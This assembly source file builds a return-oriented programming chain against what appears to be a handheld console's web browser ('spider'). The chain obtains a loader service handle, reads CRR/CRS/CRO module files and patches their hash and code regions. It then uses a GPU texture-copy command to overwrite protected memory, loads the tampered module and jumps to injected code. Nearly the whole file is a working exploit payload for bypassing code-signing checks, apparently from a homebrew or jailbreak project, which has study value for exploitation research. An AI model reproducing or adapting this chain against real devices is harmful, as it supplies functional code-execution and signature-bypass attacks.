.nds

.loadtable "../unicode.tbl"
.include "../../build/constants.s"

.create "spider_thread0_rop.bin",0x0

thread0rop:
	.word 0xDEADC0DE
	;actual ROP start

	;grab ldr:ro handle
		.word 0x0010c2fc ; pop {r0, pc}
			.word SPIDER_ROHANDLE_ADR ; r0 (dst)
		.word 0x00228af4 ; pop {r1, pc}
			.word 0x0013E484 ; r1 ("ldr:ro")
		.word 0x00102a48 ; pop	{r2, r3, r4, pc}
			.word 0x00000006 ; r2 (strlen)
			.word 0x00000000 ; r3 (flags)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00114E04 ; srv_getServiceHandle(Handle* dst, char* port, u32 strlen, u32 flags) (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

	;open and read static.crr
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+staticCrr_str ; r1 (path)
			.word 0x00000001 ; r2 (openflags) (read)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0022FE0C ; IFile_Open(_this, path, openflags) (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r1 (readbytes)
			.word SPIDER_CRRLOCATION ; r2 (dst)
			.word SPIDER_CRRSIZE ; r3 (size)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x001686E0 ; IFile_Read(_this, &readbytes, dst, size) (ends in LDMFD   SP!, {R4-R9,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)

		;copy piece that'll have to be patched
			.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
				.word SPIDER_GSPHEAPBUF ; r0 (dst)
				.word SPIDER_CRRLOCATION+0x360 ; r1 (src)
				.word 0x200  ; r2 (size)
				.word 0xDEADC0DE ; r3 (garbage)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)
				.word 0xDEADC0DE ; r7 (garbage)
				.word 0xDEADC0DE ; r8 (garbage)
				.word 0xDEADC0DE ; r9 (garbage)
				.word 0xDEADC0DE ; r10 (garbage)

	;open and read static.crs
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj+0x100 ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+staticCrs_str ; r1 (path)
			.word 0x00000001 ; r2 (openflags) (read)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0022FE0C ; IFile_Open(_this, path, openflags) (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj+0x100 ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r1 (readbytes)
			.word SPIDER_CRSLOCATION ; r2 (dst)
			.word SPIDER_CRSSIZE ; r3 (size)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x001686E0 ; IFile_Read(_this, &readbytes, dst, size) (ends in LDMFD   SP!, {R4-R9,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)

	;init ro stuff
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word 0xFFFF8001 ; r0 (processhandle)
			.word SPIDER_CRSLOCATION ; r1 (crsBuffer)
			.word SPIDER_CRSSIZE ; r2 (SPIDER_crsSize)
			.word SPIDER_CRSLOCATION ; r3 (mapAdr)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00151900 ; RO_Initialize(processhandle, crsBuffer, SPIDER_crsSize, mapAdr) (ends in LDMFD   SP!, {R4-R6,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)

		;LDRRO_LoadCRR(ldrroHandle, CRRBUF, SPIDER_CRRSIZE, 0xFFFF8001);
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word 0xFFFF8001 ; r0 (processhandle)
			.word SPIDER_CRRLOCATION ; r1 (crsBuffer)
			.word SPIDER_CRRSIZE ; r2 (SPIDER_crsSize)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0011D5D0 ; LDRRO_LoadCRR(processhandle, crsBuffer, SPIDER_crsSize, mapAdr) (ends in LDMFD   SP!, {R4,PC})
			.word 0xDEADC0DE ; r4 (garbage)

	;patch crr
		;copy patch
			.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
				.word SPIDER_GSPHEAPBUF ; r0 (dst)
				.word SPIDER_THREAD0ROP_VADR+crrPatch ; r1 (src)
				.word crrPatch_end-crrPatch  ; r2 (size)
				.word 0xDEADC0DE ; r3 (garbage)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)
				.word 0xDEADC0DE ; r7 (garbage)
				.word 0xDEADC0DE ; r8 (garbage)
				.word 0xDEADC0DE ; r9 (garbage)
				.word 0xDEADC0DE ; r10 (garbage)

		;flush data cache
			.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
				.word 0x003DA72C ; r0 (handle ptr)
				.word 0xFFFF8001 ; r1 (kprocess handle)
				.word SPIDER_GSPHEAPBUF  ; r2 (address)
				.word 0x00000200 ; r3 (size)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x0012C1E4 ; GSPGPU_FlushDataCache (ends in LDMFD   SP!, {R4-R6,PC})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)

		;send GX command
			.word 0x0010c2fc ; pop {r0, pc}
				.word 0x3D7C40+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
			.word 0x00228af4 ; pop {r1, pc}
				.word SPIDER_THREAD0ROP_VADR+gxCommand ; r1 (cmd addr)
			.word 0x0012BF08 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R10,PC})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)
				.word 0xDEADC0DE ; r7 (garbage)
				.word 0xDEADC0DE ; r8 (garbage)
				.word 0xDEADC0DE ; r9 (garbage)
				.word 0xDEADC0DE ; r10 (garbage)

	;read cro
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj+0x200 ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+ossCro_str ; r1 (path)
			.word 0x00000001 ; r2 (openflags) (read)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0022FE0C ; IFile_Open(_this, path, openflags) (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)

		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+fileObj+0x200 ; r0 (this)
			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r1 (readbytes)
			.word SPIDER_CROLOCATION ; r2 (dst)
			.word SPIDER_CROSIZE ; r3 (size)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x001686E0 ; IFile_Read(_this, &readbytes, dst, size) (ends in LDMFD   SP!, {R4-R9,PC})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)

	;patch cro (0x0 patch) (hashes)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+0x0 ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch0 ; r1 (src)
			.word croPatch0_end-croPatch0  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;patch cro (0x700 patch) (ro code)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+0x700 ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch700 ; r1 (src)
			.word croPatch700_end-croPatch700  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;patch cro (0x2000 patch) (spider code)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+0x2000 ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch2000 ; r1 (src)
			.word croPatch2000_end-croPatch2000  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;patch cro (0x1D9020 patch) (rohax stuff)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+0x1D9020 ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch1D9020 ; r1 (src)
			.word croPatch1D9020_end-croPatch1D9020  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;patch cro (0x1DBA90 patch) (rohax stuff)
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_CROLOCATION+0x1DBA90 ; r0 (dst)
			.word SPIDER_THREAD0ROP_VADR+croPatch1DBA90 ; r1 (src)
			.word croPatch1DBA90_end-croPatch1DBA90  ; r2 (size)
			.word 0xDEADC0DE ; r3 (garbage)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x00240B54 ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
			.word 0xDEADC0DE ; r4 (garbage)
			.word 0xDEADC0DE ; r5 (garbage)
			.word 0xDEADC0DE ; r6 (garbage)
			.word 0xDEADC0DE ; r7 (garbage)
			.word 0xDEADC0DE ; r8 (garbage)
			.word 0xDEADC0DE ; r9 (garbage)
			.word 0xDEADC0DE ; r10 (garbage)

	;load cro

		; CMD 0x402c2 (0x210032) 0x11d668  0xfff13490
		;     ['0x83a5000', '0x7e5000', '0x217000', '0x8381050', '0x0', '0x6630', '0x8387680', '0x338c', '0x1', '0x1', '0x0', '0xdead0032']

		; R0 : &outval
		; R1 : processHandle
		; R2 : croBuffer
		; R3 : mapaddr
		; arg_0 : SPIDER_croSize
		; arg_4 : r6 data1addr
		; arg_8 : r7 usually zero ?
		; arg_C : r8 a
		; arg_10 : r9 data2addr
		; arg_14 : r10 0xbaff1c8
		; arg_18 : 0x00 ?
		; arg_1C : r11 0x00000000
		; arg_20 : lr 0x00000000

		.word 0x0013035c ; pop {lr, pc}
			.word 0x0011D684 ; lr (LDMFD   SP!, {R4-R12,PC})
		.word 0x0010b5b4 ; pop {r0, r1, r2, r3, r4, pc}
			.word SPIDER_THREAD0ROP_VADR+tmpVar ; r0 (outval)
			.word 0xFFFF8001 ; r1 (process handle)
			.word SPIDER_CROLOCATION ; r2 (cro buffer)
			.word SPIDER_CROMAPADR ; r3 (cro map addr)
			.word 0xDEADC0DE ; r4 (garbage)
		.word 0x0011D610 ; RO_LoadAndFixCRO
			.word SPIDER_CROSIZE ; arg_0 (SPIDER_CROSIZE) (r4)
			.word 0x08381050 ; arg_4 (data1addr) (r5)
			.word 0x00000000 ; arg_8 (r6)
			.word 0x00006630 ; arg_C (a) (r7)
			.word 0x08387680 ; arg_10 (dataaddr2) (r8)
			.word 0x0000338c ; arg_14 (r9)
			.word 0x00000001 ; arg_18 (r10)
			.word 0x00000001 ; arg_1C (r11)
			.word 0x00000000 ; arg_20 (r12)

		;jump to code
		.word SPIDER_CROMAPADR+CRO_SPIDERCODE_OFFSET
		.word 0xDEADDEAD

; .orga 0x800
	.align 0x8
	romfsHandle:
		.word 0x00000000
		.word 0x00000000

	.align 0x4
	fileHandle:
		.word 0x00000000

	staticCrr_str:
		.string "rom:/.crr/static.crr"
		.byte 0x00
		.byte 0x00
	staticCrs_str:
		.string "rom:/cro/static.crs"
		.byte 0x00
		.byte 0x00
	ossCro_str:
		.string "rom:/cro/oss.cro"
		; .string "sdmc:/new_oss.cro"
		.byte 0x00
		.byte 0x00

	.align 0x4
	tmpVar:
		.word 0x00000000

	.align 0x4
	gxCommand:
		.word 0x00000004 ;command header (SetTextureCopy)
		.word SPIDER_GSPHEAPBUF ;source address
		.word SPIDER_GSPHEAP+SPIDER_CRRLOCATIONPA+0x360-0x20000000 ;destination address
		.word 0x00000200 ;size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	.align 0x4
	crrPatch:
		.incbin "../../build/cro/patchCRR.bin"
	crrPatch_end:

	.align 0x4
	croPatch0:
	.incbin "../../build/cro/patch0.bin"
	croPatch0_end:

	.align 0x4
	croPatch700:
	.incbin "../../build/cro/patch1.bin"
	croPatch700_end:

	.align 0x4
	croPatch2000:
	.incbin "../../build/cro/patch2.bin"
	croPatch2000_end:

	.align 0x4
	croPatch1D9020:
	.incbin "../../build/cro/patch3.bin"
	croPatch1D9020_end:

	.align 0x4
	croPatch1DBA90:
	.incbin "../../build/cro/patch4.bin"
	croPatch1DBA90_end:

	.align 0x4
	fileObj:

.Close
